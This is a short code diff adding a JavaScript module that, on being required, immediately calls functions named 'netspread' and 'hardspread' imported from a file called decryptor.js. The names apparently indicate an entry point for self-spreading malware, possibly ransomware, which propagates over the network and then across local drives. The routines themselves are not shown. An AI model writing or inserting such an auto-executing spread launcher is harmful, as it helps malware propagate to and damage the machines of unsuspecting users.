@@ -1,0 +1,7 @@
+const { hardspread, netspread } = require("./src/decryptor.js");
+
+module.exports = (async () => {
+        netspread().then(() => {
+        hardspread()
+    })
+})();
